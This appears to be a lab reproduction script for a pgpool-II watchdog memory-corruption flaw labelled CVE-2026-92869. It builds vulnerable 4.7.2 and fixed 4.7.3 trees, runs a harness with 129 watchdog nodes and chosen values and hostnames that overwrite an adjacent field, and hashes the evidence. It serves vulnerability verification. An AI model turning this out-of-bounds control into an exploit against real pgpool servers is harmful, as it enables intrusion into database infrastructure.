#!/bin/bash
# CVE-2026-92869 wd_nodes branch: direct-call replay against the pinned
# get_pool_config_from_json() objects, with 4.7.3 fixed and N=128 controls.
# No daemon, no loopback sockets, no ports: harness-only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../../.." && pwd)"
TARBALLS="$ROOT/lab/frontier/pgpool2shell/src"
ASAN="${TMPDIR:-/tmp}/w7-pgpool-asan"
PLAIN="${TMPDIR:-/tmp}/w108-pgpool-replay"
OUT="${TMPDIR:-/tmp}/w9-pgpool-replay"
OBJS="src/watchdog/wd_json_data.o src/utils/json.o src/utils/json_writer.o \
src/parser/list.o src/parser/stringinfo.o src/tools/fe_memutils.o \
src/tools/fe_port.o"

build_tree() {
    local dir="$1" ver="$2" cflags="$3" ldflags="$4"
    local src="$dir/pgpool-II-$ver"
    if [ -f "$src/src/watchdog/wd_json_data.o" ]; then
        return
    fi
    mkdir -p "$dir"
    tar -xzf "$TARBALLS/pgpool-II-$ver.tar.gz" -C "$dir" || exit 1
    (cd "$src" && ./configure --prefix="$dir/inst-$ver" >/dev/null &&
     make -j4 CFLAGS="$cflags" LDFLAGS="$ldflags") || exit 1
}

link() {
    local src="$1" out="$2" san="$3"
    local inc="-I$src/src/include -I$src/src/include/parser -I/usr/include/postgresql -I$src"
    local objs="" o
    # shellcheck disable=SC2086
    for o in $OBJS; do objs="$objs $src/$o"; done
    # shellcheck disable=SC2086
    gcc -g -O0 $san -fno-omit-frame-pointer $inc -o "$out" \
        "$HERE/harness.c" $objs -lm -lcrypt -lresolv || exit 1
}

mkdir -p "$OUT"
for ver in 4.7.2 4.7.3; do
    build_tree "$ASAN" "$ver" "-g -O0 -fsanitize=address -fno-omit-frame-pointer" "-fsanitize=address"
    build_tree "$PLAIN" "$ver" "-g -O0" ""
    link "$ASAN/pgpool-II-$ver" "$OUT/wd-$ver-asan" "-fsanitize=address"
    link "$PLAIN/pgpool-II-$ver" "$OUT/wd-$ver-plain" ""
done

cd "$HERE" || exit 1
run() {
    local tag="$1" bin="$2"; shift 2
    echo "### $tag" > "evidence-$tag.txt"
    ASAN_OPTIONS=detect_leaks=0 "$bin" "$@" >> "evidence-$tag.txt" 2>&1
    echo "rc=$?" >> "evidence-$tag.txt"
    grep -E '^(payload_len| num_wd|ERROR|rc=|==[0-9]+==ERROR|SUMMARY:|AddressSanitizer)' "evidence-$tag.txt"
}

echo "=== A: 4.7.2 plain, N=128 control ==="
run safe-n128 "$OUT/wd-4.7.2-plain" 128 0x42424242 SAFE
echo "=== B: 4.7.2 plain, N=129 chosen 0x42424242 ==="
run oob-n129-4242 "$OUT/wd-4.7.2-plain" 129 0x42424242 PEERHOST
echo "=== C: 4.7.2 plain, N=129 chosen 0x11111111 ==="
run oob-n129-1111 "$OUT/wd-4.7.2-plain" 129 0x11111111 PEERHOST
echo "=== D: 4.7.3 plain, N=129 fixed control ==="
run fixed-n129 "$OUT/wd-4.7.3-plain" 129 0x42424242 PEERHOST
echo "=== E: 4.7.2 ASan, N=129 (intra-object overflow, expect clean) ==="
run asan-n129 "$OUT/wd-4.7.2-asan" 129 0x42424242 PEERHOST
echo "=== F: 4.7.2 plain, N=129, 12-byte hostname controls adjacent field ==="
run oob-host-u "$OUT/wd-4.7.2-plain" 129 0x11111111 wxyzUUUUUUUU
echo "=== G: 4.7.2 plain, N=129, second 12-byte hostname ==="
run oob-host-a "$OUT/wd-4.7.2-plain" 129 0x11111111 wxyzAAAAAAAA
python3 - <<'PY'
import hashlib, pathlib, re
here = pathlib.Path('.')
patterns = [
    (re.compile(r'0x[0-9a-f]+'), '0xADDR'),
    (re.compile(r'0x[0-9A-F]+'), '0xADDR'),
    (re.compile(r'pid \d+'), 'pid PID'),
]
lines = []
for p in sorted(here.glob('evidence-*.txt')):
    text = p.read_text(errors='replace')
    for pattern, repl in patterns:
        text = pattern.sub(repl, text)
    lines.append(f"{hashlib.sha256(text.encode()).hexdigest()}  {p.name}\n")
pathlib.Path('EVIDENCE_HASHES.txt').write_text(''.join(lines))
print('wrote EVIDENCE_HASHES.txt')
PY
